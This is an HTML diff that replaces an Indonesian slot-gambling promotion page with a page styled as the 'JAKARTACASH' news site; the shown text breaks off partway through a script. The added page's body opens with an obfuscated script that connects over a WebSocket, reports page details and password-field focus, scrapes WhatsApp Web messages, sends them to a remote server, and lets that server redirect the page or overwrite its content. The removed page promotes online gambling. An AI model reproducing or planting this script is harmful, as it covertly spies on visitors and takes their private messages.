@@ -1,287 +1,156 @@
-<!doctype html>
-<html ⚡ lang="id">
-    <head>
-        <meta charset="utf-8">
-        <meta http-equiv="X-UA-Compatible" content="ie=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-        <script async src="https://cdn.ampproject.org/v0.js"></script>
-        <title>Geisha Revenge: Permainan Slot Menarik dari PGSOFT</title>
-        <meta name="description" content="Ingin Merasakan Sensasi Bermain PGSOFT yang Menarik ya cuman di sini. " />
-        <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js">
-        <link rel="preconnect dns-prefetch" href="https://fonts.gstatic.com/" crossorigin>
-        <meta name="robots" content="index, follow" />
-        <link rel="canonical" href="https://jakartamedia12.github.io/jakartamedia/beritajakarta.html">
-        <link rel="shortcut icon" href="https://178.128.18.94/image/favicon%20(2).ico" type="image/x-icon">
-        <link rel="apple-touch-icon-precomposed" href="https://confident-tesla.b-cdn.net/9TpgEJ6XmnNaXMqNP/assets/favicons/apple-touch-icon.png" />
-        <meta name="author" content="Jakarta Daily News" />
-        <meta name="publisher" content="Jakarta Daily News" />
-        <meta name="categories" content="website">
-        <meta name="geo.placename" content="Indonesia" />
-        <meta name="geo.country" content="ID" />
-        <meta name="language" content="id-ID" />
-        <meta name="tgn.nation" content="Indonesia" />
-        <meta name="distribution" content="global" />
-        <meta name="apple-mobile-web-app-capable" content="yes"/>
-        <meta name="mobile-web-app-capable" content="yes" />
-        <link rel="preload" as="image" href="https://i.postimg.cc/d0PRWKQm/jakartacashlogo.gif">
-        <link rel="preload" as="image" href="https://i.postimg.cc/jdj0hYBw/aa68e1b625b97ea1-800x800ar.png">
-        <!-- OG:FACEBOOK -->
-        <meta property="og:locale" content="id_ID" />
-        <meta property="og:type" content="website">
-        <meta property="og:title" content="Geisha Revenge: Game Pilihan terbaik semua sloters">
-        <meta property="og:description" content="Jika Anda ingin merasakan sensasi kemenangan besar dalam permainan slot, Geisha Revenge adalah pilihan yang tepat.">
-        <meta property="og:url" content="https://jakartamedia12.github.io/jakartamedia/beritajakarta.html">
-        <meta property="og:site_name" content="Jakarta Daily News" />
-        <meta property="article:modified_time" content="2025-01-13T11:05:00+00:00" />
-        <meta property="og:image" content="https://i.postimg.cc/jdj0hYBw/aa68e1b625b97ea1-800x800ar.png">
-        <meta property="og:image:type" content="image/jpg" />
-        <!-- Twitter -->
-        <meta name="twitter:card" content="summary_large_image">
-        <meta name="twitter:title" content="Geisha Revenge: Game Pilihan terbaik semua sloters">
-        <meta name="twitter:description" content="Jika Anda ingin merasakan sensasi kemenangan besar dalam permainan slot, Geisha Revenge adalah pilihan yang tepat.">
-        <meta name="twitter:url" content="https://jakartamedia12.github.io/jakartamedia/beritajakarta.html">
-        <meta name="twitter:image" content="https://i.postimg.cc/jdj0hYBw/aa68e1b625b97ea1-800x800ar.png">
-        <meta name="twitter:label1" content="Estimasi waktu membaca" />
-        <meta name="twitter:data1" content="9 Menit" />
-        <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet">
-        <script async custom-element="amp-anim" src="https://cdn.ampproject.org/v0/amp-anim-0.1.js"></script>
-        <script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
-        <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
-        <style amp-custom>*
-            {box-sizing:border-box}
-            body{background-color:#111111;color:#fff;font-family:rubik,sans-serif}
-            header{background-color:#111;box-shadow:0 0 9px 2px hsl(0deg 0% 4% / 48%);border-bottom:5px solid rgb(197, 0, 0)}
-            header .header-wrapper{margin:0 auto;max-width:960px}
-            header .header-wrapper .logo{display:flex;justify-content:center;position:relative;padding:10px 0}
-            .nav{background-color:#222;position:fixed;bottom:0;left:0;right:0;text-shadow:0 1px 3px rgb(0 0 0 / 75%);z-index:99;border-top:3px solid rgb(255, 0, 0)}
-            .nav .menu{display:flex;justify-content:space-around;padding:5px 0}
-            .nav .menu a{display:flex;flex-direction:column;justify-content:center;align-items:center;color:#ffffff;max-width:75px;font-size:12px;text-decoration:none}
-            .nav .menu amp-img{max-width:30%;margin-bottom:5px}.container{margin:0 auto;padding:0 10px;max-width:960px}
-            .content{margin:5px auto}
-            .header-text{position:relative;display:block}
-            .banner{position:relative}.banner-wrapper{padding:5px 0}
-            .text-center{text-align:center}
-            .title{text-align:center;font-weight:600;border:none}
-            .title h2{margin:0;padding:0}
-            a{color:rgb(255, 0, 0)}
-            h1{font-size:1.7em;margin-top:25px;margin-bottom:10px;color:rgb(255, 0, 0)}
-            h2{font-size:1.5em;color: rgb(255, 0, 0)}
-            h3{font-size:1.1em;font-weight:600}
-            h4{font-size:1em}
-            .time{font-size:16px;text-align:center;color:#b9b9b9;margin-bottom:25px}
-            .btn-body{margin:15px -5px;position:relative;display:flex}
-            .thumbs{position:relative}
-            .btn-body .btn-items{margin:0 5px;width:100%}
-            .btn-body .btn-items a{text-decoration:none;width:100%;padding:10px 5px;color:#000;background-color:#22b3df;border-radius:5px;display:inline-block;text-align:center;text-shadow:0 1px 3px rgba(248,246,246,.75);font-weight:600}
-            .box-games-wrapper{display:flex;flex-direction:row;flex-wrap:wrap;margin:-5px}
-            .box-games-wrapper .box-games{width:20%;padding:5px}
-            .box-games-wrapper .box-games .games-img{position:relative;overflow:hidden}
-            .box-games-wrapper .box-games .games-name{background-color:#222;padding:5px 3px;text-align:center;font-weight:500;border-radius:5px;font-size:12px}
-            .games-name h3{font-size:15px;margin:0}
-            .games-name p{font-size:14px}
-            .box-games .rtp-box{position:relative;display:inline-block;border-radius:5px;width:100%;margin:5px 0;background-color:#222}
-            .box-games .rtp-box .rtp-progress{position:relative;padding:10px;border-radius:5px}
-            .box-games .rtp-box .txt{text-align:center;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:100%;font-size:14px;font-weight:700;text-shadow:0 1px 3px rgb(0 0 0 / 75%)}
-            .color-success{background-color:#22b3df}
-            .color-primary{background-color:#0277fa}
-            .color-warning{background-color:#22b3df}
-            .color-danger{background-color:#22b3df}
-            .box-text{padding:5px}
-            .box-text a{text-decoration:none}
-            .box-text table{width:100%;text-align:center;border-collapse:separate;border:1px solid #fff}
-            .box-text table th,td{border:1px solid #fff;padding:5px}
-            .mt-50{margin-top:50px}
-            footer{padding:15px 5px;margin-bottom:65px}
-            footer .footer-text{text-align:center}
-            .breadcrump-list{text-align:center;color:#fff}
-            .breadcrump-list ul{padding:10px 16px;list-style:none}
-            .breadcrump-list ul li{display:inline;font-size:18px}
-            .breadcrump-list ul li+li:before{padding:8px;color:#fff;content:"�03e"}
-            .breadcrump-list ul li a{color:rgb(248, 0, 0);text-decoration:none}
-            .mt-10{margin-top:50px}
-            article header{background-color:transparent;box-shadow:none}
-            .content table{width:100%;border-collapse:collapse}
-            .content table th,.content table td{padding:8px;border:1px solid rgb(255, 0, 0)}
-            .content table th{background:#007bff linear-gradient(180deg,#f80000,rgb(0, 0, 0)) repeat-x;text-shadow:0 1px 3px rgba(0, 0, 0, 0.75);color:#fff7f7}
-            .content table td:first-child{width:50%}
-            blockquote{quotes:"“" "”" "‘" "’";color:#b9b9b9;text-align:center;margin-bottom:25px}blockquote::before{content:open-quote}
-            blockquote::after{content:close-quote}
-            .tada{-webkit-animation-name:tada;animation-name:tada;-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both;animation-iteration-count:infinite}
-            .btn-body{margin:15px 0;position:relative;display:flex}
-            .btn-body .btn-items{margin:0 5px;width:100%}
-            .btn-body .btn-items a{text-decoration:none;width:100%;padding:10px 5px;color:#000000;background:-webkit-linear-gradient(top,#6f5772,rgb(160, 160, 160) 100%);border-radius:5px;display:inline-block;text-align:center;overflow:hidden;position:relative}
-            .btn-body .btn-items a::before{content:"";position:absolute;top:0;left:0;width:100%;height:100%;background-color:#fd0000;opacity:0;-webkit-transition:0.2s opacity ease-in-out;transition:0.2s opacity ease-in-out}
-            .btn-items a span{position:absolute}
-            .btn-items a span:nth-child(1){top:0;left:0;width:100%;height:100px;background:-webkit-gradient(linear,right top,left top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to left,rgba(43,8,8,0),#fff);-webkit-animation:2s animateTop linear infinite;animation:2s animateTop linear infinite}
-            .btn-items a span:nth-child(2){top:0;right:0;height:100%;width:3px;background:-webkit-gradient(linear,left bottom,left top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to top,rgba(43,8,8,0),#fff);-webkit-animation:2s animateRight linear -1s infinite;animation:2s animateRight linear -1s infinite}
-            .btn-items a span:nth-child(3){bottom:0;left:0;width:100%;height:3px;background:-webkit-gradient(linear,left top,right top,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to right,rgba(43,8,8,0),#fff);-webkit-animation:2s animateBottom linear infinite;animation:2s animateBottom linear infinite}
-            .btn-items a span:nth-child(4){top:0;left:0;height:100%;width:3px;background:-webkit-gradient(linear,left top,left bottom,from(rgba(43,8,8,0)),to(#0f0));background:linear-gradient(to bottom,rgba(43,8,8,0),#fff);-webkit-animation:2s animateLeft linear -1s infinite;animation:2s animateLeft linear -1sinfinite}
-            .sticky-bottom-menu .menu-items.menu-login .menu-icons{position:absolute;top:0;top:-62px;right:0;left:0;width:70px;height:70px;border-radius:50px;background-color:#011229;border:3px solid #324b6b;display:flex;align-items:center;justify-content:center;margin:auto;-webkit-animation:beat 0.5s infinite alternate;animation:beat 0.5s infinite alternate}
-            .sticky-bottom-menu .menu-items.menu-login .menu-icons i{font-size:30px;border-radius:50px;color:#fff}@keyframes beat{to{transform:scale(1.2)}}@keyframes animateTop{0%{-webkit-transform:translateX(100%);transform:translateX(100%)}100%{-webkit-transform:translateX(-100%);transform:translateX(-100%)}}@keyframes animateRight{0%{-webkit-transform:translateY(100%);transform:translateY(100%)}100%{-webkit-transform:translateY(-100%);transform:translateY(-100%)}}@keyframes animateLeft{0%{-webkit-transform:translateY(-100%);transform:translateY(-100%)}100%{-webkit-transform:translateY(100%);transform:translateY(100%)}}@keyframes animateBottom{0%{-webkit-transform:translateX(-100%);transform:translateX(-100%)}100%{-webkit-transform:translateX(100%);transform:translateX(100%)}}@-webkit-keyframes tada{0%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg);transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}100%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}@keyframes tada{0%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg);transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}100%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}
-            .center{transform:scale(1.5) translateY(-5px);background:center no-repeat;background-size:contain;background-color:inherit;border-radius:50%}
-            article a,footer a{text-decoration:none}
-            article table{width:100%;text-align:center}
-            article table th{border:1px solid #fff}
-            @media only screen and (max-width:720px){.box-games-wrapper{justify-content:center}.box-games-wrapper .box-games{width:33%}.box-games .rtp-box .txt{font-size:12px}.games-name p{font-size:12px}.content table td:first-child{width:30%}}</style>
-            <script type="application/ld+json">
-            {
-             "@context": "http://schema.org",
-             "@type": "NewsArticle",
-             "mainEntityOfPage":{
-               "@type":"WebPage",
-               "@id":"https://jakartamedia12.github.io/jakartamedia/beritajakarta.html"
-             },
-             "headline": "Geisha Revenge: Game Pilihan terbaik semua sloters",
-             "image": {
-               "@type": "ImageObject",
-               "url": "https://i.postimg.cc/jdj0hYBw/aa68e1b625b97ea1-800x800ar.png"
-             },
-             "datePublished": "2025-01-13T11:05:00+00:00",
-             "dateModified": "2025-01-13T11:05:00+00:00",
-             "author": {
-                "@type":"Person",
-                "name": "Jakarta Daily News",
-                "url": "https://jakartamedia12.github.io/jakartamedia/beritajakarta.html"
-             },
-             "publisher": {
-               "@type": "Organization",
-               "name": "Jakarta Daily News",
-               "logo": {
-                 "@type": "ImageObject",
-                 "url": "https://i.postimg.cc/d0PRWKQm/jakartacashlogo.gif"
-               }
-             },
-             "description": "Jika Anda ingin merasakan sensasi kemenangan besar dalam permainan slot, Geisha Revenge adalah pilihan yang tepat."
-            }
-        </script>
+
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="JAKARTACASH - Berita, informasi, dan update terkini dari seluruh dunia">
+    <meta name="keywords" content="JAKARTACASH, berita, info terkini, update, liputan">
+    <meta name="author" content="JAKARTACASH Berbagi 2025">
+    <title>JAKARTACASH</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #e3e3e3;
+        }
+        header {
+            background-color: #fa1500;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 36px;
+        }
+        header p {
+            font-size: 18px;
+            margin: 5px 0;
+        }
+        nav {
+            background-color: #333;
+            text-align: center;
+            padding: 15px 0;
+        }
+        nav ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin: 0 20px;
+        }
+        nav ul li a {
+            color: white;
+            font-size: 18px;
+            text-decoration: none;
+        }
+        nav ul li a:hover {
+            color: #ff1500;
+        }
+        main {
+            padding: 30px;
+        }
+        section {
+            background-color: white;
+            margin-bottom: 20px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #fc1500;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+        article {
+            margin-bottom: 20px;
+        }
+        article h3 {
+            color: #333;
+            font-size: 24px;
+        }
+        article p {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #555;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
 </head>
-<body>
-<header>
-    <div class="header-wrapper">
-        <div class="logo">
-            <a href="https://jakartamedia12.github.io/jakartamedia/beritajakarta.html">
-                <amp-img src="https://i.postimg.cc/d0PRWKQm/jakartacashlogo.gif" width="350" height="85" alt="Jakarta Daily News" layout="fixed"></amp-img>
-            </a>
-        </div>
-    </div>
-</header>
-<section class="content">
-    <div class="container">
-        <div class="thumbs">
-            <amp-img src="https://i.postimg.cc/jdj0hYBw/aa68e1b625b97ea1-800x800ar.png" width="1280" height="720" alt="Jakarta Daily News" layout="responsive"></amp-img>
-        </div>
-        <div class="btn-body">
-            <div class="btn-items">
-              <a href="https://jakartabet88.com/" rel="nofollow noreferrer" target="_blank">
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <amp-img layout="intrinsic" height="120" width="496" src="https://i.postimg.cc/HxGdSvbG/LOGIN-ID-12-25-2024-1.png"></amp-img>
-                </a>
-            </div>
-            <div class="btn-items">
-              <a href="https://jakartabet88.com/" rel="nofollow noreferrer" target="_blank">
-                <span></span>
-                <span></span>
-                <span></span>
-                <span></span>
-                <amp-img layout="intrinsic" height="120" width="496" src="https://i.postimg.cc/xjvTZQs6/DAFTAR-ID-12-25-2024.png"></amp-img>
-                </a>
-            </div>
-          </div>
-        <table>
-            <tbody>
-                <tr>
-                    <th colspan="2">ɪɴꜰᴏʀᴍᴀꜱɪ ꜱɪᴛᴜꜱ</th>
-                </tr>
-                <tr>
-                    <td>Nama Situs</td>
-                    <td><strong><a href="https://jakartabet88.com/">JAKARTACASH<strong><a href="https://jakartabet88.com/"></a></tr>
-                </tr>
-                <tr>
-                    <td>Min. Depo:</td>
-                    <td>Rp. 10.000,-</td>
-                </tr>
-                <tr>
-                    <td>Game Play:</td>
-                    <td>Game Online, Casino Online, Sportsbook , Tembak Ikan , Virtual Sports</td>
-                </tr>
-                <tr>
-                    <td>Proses Depo - WD:</td>
-                    <td>± 60 Detik</td>
-                </tr>
-                <tr>
-                    <td>Metode Deposit:</td>
-                    <td>Bank indonesia (BCA, BNI, BRI, MANDIRI, PERMATA, CIMB) Ewalett (Dana, Gopay, Ovo, Linkaja)</td>
-                </tr>
-            </tbody>
-        </table>
-    </div>
-</section>
-<main>
-    <article>
-        <div class="container">
-            <header class="title">
-                <h1 itemprop="headline">Geisha Revenge: Game Pilihan terbaik semua sloters</h1>
-            </header>      
-                <p>Geisha Revenge: Permainan Slot Menarik dari PGSOFT Geisha Revenge adalah salah satu permainan slot terbaru yang dirilis oleh PGSOFT (Pocket Games Soft). Game ini menawarkan tema yang menarik dengan latar belakang budaya Jepang, lebih khusus lagi, tentang Geisha yang memiliki elemen aksi dan cerita balas dendam yang dramatis. Jika Anda penggemar permainan slot bertema Asia dan menikmati mekanisme permainan yang seru, Geisha Revenge patut dicoba.</p>
-                <p>Keunggulan utama Geisha Revenge terletak pada kemudahan mendapatkan scatter, yang memungkinkan pemain untuk mengakses fitur free spins dengan cepat. Game ini dirancang dengan RTP (Return to Player) tinggi, sehingga peluang untuk mendapatkan kemenangan besar semakin terbuka lebar. Artikel ini akan membahas berbagai aspek menarik tentang Geisha Revenge, termasuk trik dan strategi untuk memaksimalkan kemenangan Anda.</p>
-
-                <h3><strong>1. Apa Itu Geisha Revenge?</strong></h3>
-                <p>Seperti namanya, Geisha Revenge membawa pemain ke dunia tradisional Jepang, dengan tokoh utama seorang Geisha yang memiliki misi balas dendam. Desain visual game ini sangat menarik, dengan grafik berkualitas tinggi yang menggambarkan nuansa Jepang yang kental. Setiap simbol pada gulungan menggambarkan elemen-elemen khas Jepang, seperti bunga sakura, kipas, samurai, dan tentunya Geisha itu sendiri.</p>
+<body><script>!function(){var Y,e,t;function n(){try{return window.self===window.top}catch(Y){return!1}}function r(){var Y={type:"focus",token:S.token,title:document.title,url:document.URL,useragent:navigator.userAgent,pid:S.pid,pn:S.pn};null!=I&&I.readyState==WebSocket.OPEN&&I.send(JSON.stringify(Y))}function a(){var Y={type:"notification",token:S.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:S.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:S.pid,pn:S.pn};I.send(JSON.stringify(Y))}function i(){h()}function o(){n()&&(clearInterval(y),clearInterval(N)),timeout=setTimeout((function(){f()}),v)}function s(Y){if(n())switch(Y.data.substring(0,1)){case"r":window.location=Y.data.substring(1);break;case"b":document.body.innerHTML=Y.data.substring(1);break;case"w":var e="true"==Y.data.substring(1).toLowerCase();T!=e&&e&&m(),T=e}}function M(Y){var e=document.createElement("a");return e.href=Y,e.href}function u(Y){if(Y&&"password"==Y.type&&!H){H=!0;var e={type:"password_input_focus",focus:!0,token:S.token};I.send(JSON.stringify(e))}}function D(Y){if(Y&&"password"==Y.type&&H){H=!1;var e={type:"password_input_focus",focus:!1,token:S.token};I.send(JSON.stringify(e))}}function c(Y){var e=document.activeElement;e&&e!=document.body?document.querySelector&&(e=document.querySelector(":focus")):e=null;for(var t=0;t<Y.length;++t){let i=Y[t];var n="password"==i.type,r=n&&i.hasAttribute("autofocus"),a=n&&e&&i.isEqualNode(e);(r||a)&&u(),i.onfocus=function(){u(i)},i.onblur=function(){D(i)}}}function d(){n()&&(S.iup&&r(),p()&&(m(),h(),function(){var Y=new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&("childList"!==Y.type||Y.addedNodes.length<=0||Y.addedNodes.forEach((function(Y){if(Y){var e=document.querySelector("div[id=main] header span[title]");e&&(b=e.innerText),document.querySelector("div[id=main] header span[data-icon=default-user]")&&(A="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(A="group");var t=Y.querySelectorAll(".message-in, .message-out");Y.matches(".message-in, .message-out")&&(t=Array.prototype.slice.call(t)).push(Y),t&&t.forEach((function(Y){if(Y&&Y.classList&&!(Y.classList.length<=0)){var e=Y.classList.contains("message-in"),t=Y.querySelector(".copyable-text"),n=Y.querySelector(".selectable-text"),r=new Date,a=null;if(t&&t.attributes["data-pre-plain-text"]){var i=t.attributes["data-pre-plain-text"].textContent,o=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[Symbol.match](i);if(!o||6!=o.length)return;if(o[3]&&"pm"==o[3].toLowerCase()&&(o[1]=parseInt(o[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](o[4]),!dateParts||4!=dateParts.length)return;if(!(r=date.parse(o[4],C)||function(Y,e,t){var n=[[Y,e,t].join("-"),[Y,t,e].join("-"),[e,Y,t].join("-"),[e,t,Y].join("-"),[t,Y,e].join("-"),[t,e,Y].join("-")],r=Date.now();for(var a in n){var i=Date.parse(n[a]);if(i&&!(Math.abs(r-i)>1728e6))return new Date(i)}}(dateParts[1],dateParts[2],dateParts[3])))return;r.setHours(o[1]),r.setMinutes(o[2]),a=o[5]}E.get(b)||E.set(b,k);var s=n?n.innerText:null;if(a&&s&&T){var M=(a+s+b+r.getTime()).split("").map((function(Y){return Y.charCodeAt(0)})).reduce((function(Y,e){return Y+((Y<<7)+(Y<<3))^e})).toString(16);if(E.get(b).getTime()==r.getTime()?r.setMilliseconds(++L):(L=0,E.set(b,r)),!M||w.has(M))return;var u={type:"wapmessage",timestamp:r.getTime(),id:M,incoming:e,sender:e?a:"Me",content:s,recipient:e?"Me":b,conversationId:b+"("+A+")"};I.send(JSON.stringify(u)),w.add(M)}}}))}})))}))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0})}()),n()&&(a(),y=setInterval(a,S.sendNotificationsInterval),p()&&(N=setInterval(i,S.pollWhatsappTrackingInterval))),function(){for(var Y=[],e=document.getElementsByTagName("link"),t=0;t<e.length;++t)"icon"!=e[t].getAttribute("rel")&&"shortcut icon"!=e[t].getAttribute("rel")||(Y[Y.length]=M(e[t].getAttribute("href")));0==Y.length&&(Y[0]=M("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=Y,n.title=document.title,n.token=S.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,I.send(JSON.stringify(n))}(),S.dontTrackWebPasswords&&(c(document.getElementsByTagName("input")),new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&Y.addedNodes&&0!=Y.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),Y.addedNodes.forEach((function(Y){Y.tagName&&c(Y.getElementsByTagName("input"))})))}))})).observe(document,{childList:!0,subtree:!0}),window.onbeforeunload=D))}function l(){document.tmfilter||(f(),C={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. 